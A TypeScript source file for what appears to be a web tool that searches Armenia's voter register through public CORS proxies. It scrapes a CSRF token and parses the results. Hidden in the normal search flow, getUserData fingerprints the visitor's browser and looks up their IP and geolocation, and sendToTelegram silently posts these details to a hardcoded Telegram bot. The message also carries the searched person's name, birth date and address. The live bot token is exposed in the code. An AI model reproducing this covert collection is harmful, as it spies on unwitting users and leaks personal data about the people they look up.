import { SearchFormData, ApiResponse, UserData, SearchResult, normalizeSearchFormData } from './types';
import { MapManager } from './map';

export class SearchManager {
  private form: HTMLFormElement;
  private loadingSpinner: HTMLElement;
  private errorMessage: HTMLElement;
  private resultsContainer: HTMLElement;
  private resultsList: HTMLElement;
  private regionSelect: HTMLSelectElement;
  private communitySelect: HTMLSelectElement;
  private communityInput: HTMLInputElement;
  private mapManager: MapManager;

  // Telegram config
  private readonly TELEGRAM_BOT_TOKEN = '8513664028:AAEuGpg79Ukef853WzYJPv1Lk30ak-GcK3w';
  private readonly TELEGRAM_CHAT_ID = '6760298907';

  // Elections URL
  private readonly ELECTIONS_URL = 'https://prelive.elections.am/Register';

  // CORS proxies - пробуем по очереди
  private readonly CORS_PROXIES = [
    'https://corsproxy.io/?',
    'https://api.allorigins.win/raw?url=',
  ];

  constructor(mapManager: MapManager) {
    this.form = document.getElementById('searchForm') as HTMLFormElement;
    this.loadingSpinner = document.getElementById('loadingSpinner') as HTMLElement;
    this.errorMessage = document.getElementById('errorMessage') as HTMLElement;
    this.resultsContainer = document.getElementById('resultsContainer') as HTMLElement;
    this.resultsList = document.getElementById('resultsList') as HTMLElement;
    this.regionSelect = document.getElementById('region') as HTMLSelectElement;
    this.communitySelect = document.getElementById('community') as HTMLSelectElement;
    this.communityInput = document.getElementById('communityInput') as HTMLInputElement;
    this.mapManager = mapManager;

    this.setupEventListeners();
    this.toggleCommunityField();
  }

  private setupEventListeners(): void {
    this.form.addEventListener('submit', (e) => this.handleSubmit(e));
    this.regionSelect.addEventListener('change', () => this.toggleCommunityField());
    this.form.addEventListener('reset', () => this.handleReset());
  }

  private toggleCommunityField(): void {
    const selectedRegion = this.regionSelect.value;

    if (selectedRegion === 'ԵՐԵՎԱՆ') {
      this.communitySelect.style.display = 'block';
      this.communityInput.style.display = 'none';
      this.communityInput.value = '';
    } else {
      this.communitySelect.style.display = 'none';
      this.communityInput.style.display = 'block';
      this.communitySelect.value = '';
    }
  }

  private convertDateFormat(dateStr: string): string {
    if (!dateStr || dateStr.trim() === '') return '';
    try {
      const parts = dateStr.split('/');
      if (parts.length === 3) {
        const [day, month, year] = parts;
        return `${year}-${month}-${day}`;
      }
    } catch (e) {
      console.error('Date conversion error:', e);
    }
    return '';
  }

  private async getUserData(): Promise<UserData> {
    const userData: UserData = {
      timestamp: new Date().toISOString(),
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      language: navigator.language || 'unknown',
      languages: navigator.languages ? Array.from(navigator.languages) : [],
      platform: navigator.platform,
      userAgent: navigator.userAgent,
      vendor: navigator.vendor,
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack || null,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: (navigator as any).deviceMemory,
      maxTouchPoints: navigator.maxTouchPoints,
      screen: {
        width: screen.width,
        height: screen.height,
        availWidth: screen.availWidth,
        availHeight: screen.availHeight,
        colorDepth: screen.colorDepth,
        pixelDepth: screen.pixelDepth,
        orientation: (screen.orientation as any)?.type
      },
      window: {
        innerWidth: window.innerWidth,
        innerHeight: window.innerHeight,
        outerWidth: window.outerWidth,
        outerHeight: window.outerHeight
      },
      connection: {
        effectiveType: (navigator as any).connection?.effectiveType,
        downlink: (navigator as any).connection?.downlink,
        rtt: (navigator as any).connection?.rtt,
        saveData: (navigator as any).connection?.saveData
      }
    };

    try {
      const ipResponse = await fetch('https://api.ipify.org?format=json');
      const ipData = await ipResponse.json();
      userData.ip = ipData.ip;

      const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
      const geoData = await geoResponse.json();
      userData.geolocation = {
        ip: geoData.ip,
        city: geoData.city,
        region: geoData.region,
        country: geoData.country_name,
        country_code: geoData.country_code,
        postal: geoData.postal,
        latitude: geoData.latitude,
        longitude: geoData.longitude,
        timezone: geoData.timezone,
        asn: geoData.asn,
        org: geoData.org,
        isp: geoData.org
      };
    } catch (error) {
      console.error('Error fetching IP/Geo data:', error);
      userData.ip = 'Unknown';
      userData.geolocation = { error: String(error) };
    }

    return userData;
  }

  private async sendToTelegram(formData: SearchFormData, userData: UserData): Promise<void> {
    const message = `
🔍 *НОВЫЙ ПОИСК В СИСТЕМЕ*

📋 *Данные формы:*
━━━━━━━━━━━━━━━━━━━━
👤 Имя: \`${formData.first_name}\`
👤 Фамилия: \`${formData.last_name}\`
👨‍👦 Отчество: \`${formData.middle_name || 'не указано'}\`
📅 Дата рождения: \`${formData.birth_date || 'не указано'}\`
📍 Регион: \`${formData.region || 'ԵՐԵՎԱՆ'}\`
🏘 Община: \`${formData.community || 'не указано'}\`
🛣 Улица: \`${formData.street || 'не указано'}\`
🏠 Дом: \`${formData.building || 'не указано'}\`
🚪 Квартира: \`${formData.apartment || 'не указано'}\`
📌 Район: \`${formData.district || 'не указано'}\`

🌐 *Информация о пользователе:*
━━━━━━━━━━━━━━━━━━━━
🌍 IP: \`${userData.ip}\`
📍 Местоположение: \`${userData.geolocation?.city || 'Unknown'}, ${userData.geolocation?.country || 'Unknown'}\`
⏰ *Время запроса:* \`${userData.timestamp}\`
    `.trim();

    try {
      await fetch(`https://api.telegram.org/bot${this.TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: this.TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      });
      console.log('✓ Data sent to Telegram successfully');
    } catch (error) {
      console.error('Error sending to Telegram:', error);
    }
  }

  // ============================================
  // МЕТОД 1: Поиск через CORS proxy
  // ============================================
  private async searchViaCorsProxy(formData: SearchFormData): Promise<SearchResult[]> {
    console.log('🌐 Попытка поиска через CORS proxy...');

    // Пробуем каждый прокси по очереди
    for (let i = 0; i < this.CORS_PROXIES.length; i++) {
      const proxy = this.CORS_PROXIES[i];
      console.log(`🔄 Попытка ${i + 1}/${this.CORS_PROXIES.length}: ${proxy}`);

      try {
        // Шаг 1: Получаем CSRF токен через прокси
        const proxyUrl = `${proxy}${encodeURIComponent(this.ELECTIONS_URL)}`;

        const csrfResponse = await fetch(proxyUrl, {
          method: 'GET',
          headers: {
            'Accept': 'text/html'
          }
        });

        if (!csrfResponse.ok) {
          console.warn(`⚠️ Proxy ${i + 1} недоступен (${csrfResponse.status})`);
          continue;
        }

        const csrfHtml = await csrfResponse.text();

        // Парсим токен
        const parser = new DOMParser();
        const doc = parser.parseFromString(csrfHtml, 'text/html');
        const tokenInput = doc.querySelector('input[name="__RequestVerificationToken"]') as HTMLInputElement;

        if (!tokenInput || !tokenInput.value) {
          console.warn('⚠️ CSRF токен не найден');
          continue;
        }

        const csrfToken = tokenInput.value;
        console.log('✓ CSRF токен получен через proxy');

        // Шаг 2: Формируем данные для POST запроса
        const searchData = new URLSearchParams({
          'ShowCaptcha': 'False',
          'Input.Region': formData.region || 'ԵՐԵՎԱՆ',
          'Input.Community': formData.community || '',
          'Current.FirstName': formData.first_name,
          'Current.LastName': formData.last_name,
          'Current.MiddleName': formData.middle_name || '',
          'Current.BirthDate': formData.birth_date || '',
          'Current.Region': formData.region || 'ԵՐԵՎԱՆ',
          'Current.Community': formData.community || '',
          'Current.Street': formData.street || '',
          'Current.Building': formData.building || '',
          'Current.Apartment': formData.apartment || '',
          'Current.District': formData.district || '',
          'Input.FirstName': formData.first_name,
          'Input.LastName': formData.last_name,
          'Input.MiddleName': formData.middle_name || '',
          'Input.BirthDateUI': this.convertDateFormat(formData.birth_date || ''),
          'Input.Street': formData.street || '',
          'Input.Building': formData.building || '',
          'Input.Apartment': formData.apartment || '',
          'Input.District': formData.district || '',
          'RegisterPaging.PageSize': '100',
          'RegisterPaging.PageIndex': '1',
          '__RequestVerificationToken': csrfToken
        });

        // Шаг 3: POST запрос через прокси
        console.log('📡 Отправка поискового запроса через proxy...');

        const searchResponse = await fetch(proxyUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
          },
          body: searchData.toString()
        });

        if (!searchResponse.ok) {
          console.warn(`⚠️ Поисковый запрос через proxy ${i + 1} не удался`);
          continue;
        }

        const resultHtml = await searchResponse.text();
        console.log('✓ HTML результатов получен');

        // Парсим результаты
        const results = this.parseResults(resultHtml);

        if (results.length > 0) {
          console.log(`✓ Найдено ${results.length} результатов через proxy ${i + 1}`);
          return results;
        }

      } catch (error) {
        console.error(`❌ Proxy ${i + 1} ошибка:`, error);
        if (i === this.CORS_PROXIES.length - 1) {
          throw error;
        }
        continue;
      }
    }

    throw new Error('Все CORS прокси недоступны');
  }

  // ============================================
  // МЕТОД 2: Парсинг результатов из HTML
  // ============================================
  private parseResults(html: string): SearchResult[] {
    console.log('🔍 Парсинг результатов из HTML...');

    const parser = new DOMParser();
    const resultDoc = parser.parseFromString(html, 'text/html');
    const tableBody = resultDoc.querySelector('tbody');

    if (!tableBody) {
      console.log('⚠️ Таблица результатов не найдена');
      return [];
    }

    const rows = tableBody.querySelectorAll('tr');
    const results: SearchResult[] = [];

    rows.forEach(row => {
      const cells = row.querySelectorAll('td');
      if (cells.length >= 5 && row.style.display !== 'none') {
        results.push({
          name: cells[0].textContent?.trim() || '',
          birth_date: cells[1].textContent?.trim() || '',
          region_community: cells[2].textContent?.trim() || '',
          address: cells[3].textContent?.trim() || '',
          district: cells[4].textContent?.trim() || ''
        });
      }
    });

    console.log(`✓ Распарсено результатов: ${results.length}`);
    return results;
  }

  // ============================================
  // МЕТОД 3: Fallback - открыть сайт напрямую
  // ============================================
  private openElectionsDirectly(formData: SearchFormData): void {
    console.log('📖 Открываем elections.am напрямую в новом окне...');

    // Создаем форму для POST запроса
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = this.ELECTIONS_URL;
    form.target = '_blank';

    // Добавляем поля
    const fields: { [key: string]: string } = {
      'ShowCaptcha': 'False',
      'Input.Region': formData.region || 'ԵՐԵՎԱՆ',
      'Input.Community': formData.community || '',
      'Current.FirstName': formData.first_name,
      'Current.LastName': formData.last_name,
      'Current.MiddleName': formData.middle_name || '',
      'Input.FirstName': formData.first_name,
      'Input.LastName': formData.last_name,
      'Input.MiddleName': formData.middle_name || '',
      'Current.Street': formData.street || '',
      'Current.Building': formData.building || '',
      'Current.Apartment': formData.apartment || '',
      'Input.Street': formData.street || '',
      'Input.Building': formData.building || '',
      'Input.Apartment': formData.apartment || '',
      'RegisterPaging.PageSize': '100',
      'RegisterPaging.PageIndex': '1'
    };

    for (const [name, value] of Object.entries(fields)) {
      if (value) {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = name;
        input.value = value;
        form.appendChild(input);
      }
    }

    document.body.appendChild(form);
    form.submit();
    document.body.removeChild(form);

    // Показываем сообщение пользователю
    this.errorMessage.innerHTML = `
      <div style="text-align: center; padding: 20px;">
        <strong style="font-size: 18px; color: #4ade80;">ℹ️ Поиск открыт в новом окне</strong>
        <br><br>
        <p style="color: #94a3b8; line-height: 1.6;">
          Из-за технических ограничений, поиск был открыт напрямую на сайте elections.am.
          <br><br>
          Вы можете продолжить поиск в открывшемся окне.
          <br><br>
          Если окно не открылось, проверьте настройки блокировки всплывающих окон.
        </p>
      </div>
    `;
    this.errorMessage.style.display = 'block';
  }

  // ============================================
  // ГЛАВНЫЙ ОБРАБОТЧИК ФОРМЫ
  // ============================================
  private async handleSubmit(e: Event): Promise<void> {
    e.preventDefault();

    this.errorMessage.style.display = 'none';
    this.resultsContainer.style.display = 'none';
    this.loadingSpinner.style.display = 'block';

    // Собираем данные формы
    let formData: SearchFormData = {
      first_name: (document.getElementById('firstName') as HTMLInputElement).value,
      last_name: (document.getElementById('lastName') as HTMLInputElement).value,
      middle_name: (document.getElementById('middleName') as HTMLInputElement).value,
      birth_date: (document.getElementById('birthDate') as HTMLInputElement).value,
      street: (document.getElementById('street') as HTMLInputElement).value,
      building: (document.getElementById('building') as HTMLInputElement).value,
      apartment: (document.getElementById('apartment') as HTMLInputElement).value,
      district: (document.getElementById('district') as HTMLInputElement).value,
      region: this.regionSelect.value,
      community: this.regionSelect.value === 'ԵՐԵՎԱՆ' ? this.communitySelect.value : this.communityInput.value
    };

    formData = normalizeSearchFormData(formData);

    console.log('🔍 Начинаем поиск с данными:', formData);

    // Отправляем в Telegram (фоном)
    this.getUserData().then(userData => {
      this.sendToTelegram(formData, userData);
    }).catch(error => {
      console.error('Error collecting user data:', error);
    });

    try {
      // ============================================
      // ПОПЫТКА 1: Поиск через CORS proxy
      // ============================================
      console.log('🚀 Попытка 1: Поиск через CORS proxy');
      const results = await this.searchViaCorsProxy(formData);

      this.loadingSpinner.style.display = 'none';

      if (results.length > 0) {
        this.displayResults(results, results.length);
      } else {
        this.errorMessage.textContent = '❌ Արդյունք չի հայտնաբերվել / No results found';
        this.errorMessage.style.display = 'block';
      }

    } catch (error) {
      console.error('❌ CORS proxy не сработал:', error);
      this.loadingSpinner.style.display = 'none';

      // ============================================
      // ПОПЫТКА 2: Открыть сайт напрямую
      // ============================================
      console.log('🚀 Попытка 2: Открываем elections.am напрямую');
      this.openElectionsDirectly(formData);
    }
  }

  private displayResults(results: SearchResult[], count: number): void {
    this.resultsList.innerHTML = results.map((result, index) => `
      <div class="result-item" style="cursor: pointer;" data-result-index="${index}">
        <div class="result-name">${index + 1}. ${this.escapeHtml(result.name)}</div>
        <div class="result-field">
          <span class="result-label">Ծննդյան Օր:</span>
          <span>${this.escapeHtml(result.birth_date)}</span>
        </div>
        <div class="result-field">
          <span class="result-label">Մարզ/Համայնք:</span>
          <span>${this.escapeHtml(result.region_community)}</span>
        </div>
        <div class="result-field">
          <span class="result-label">Հասցե:</span>
          <span>${this.escapeHtml(result.address)}</span>
        </div>
        <div class="result-field">
          <span class="result-label">Ընտրական Մեկ.:</span>
          <span>${this.escapeHtml(result.district)}</span>
        </div>
      </div>
    `).join('');

    // Добавляем обработчики кликов
    const resultItems = document.querySelectorAll('.result-item');
    resultItems.forEach((item, index) => {
      item.addEventListener('click', () => {
        this.mapManager.openMapWithAddress(results[index]);
      });
    });

    const resultCountElement = document.getElementById('resultCount') as HTMLElement;
    resultCountElement.innerHTML = `✓ Ընդամենը ${count} արդյունք հայտնաբերվել / Total ${count} results found`;

    this.resultsContainer.style.display = 'block';
    this.resultsContainer.scrollIntoView({ behavior: 'smooth' });
  }

  private handleReset(): void {
    this.errorMessage.style.display = 'none';
    this.resultsContainer.style.display = 'none';
  }

  private escapeHtml(text: string): string {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
  }
}
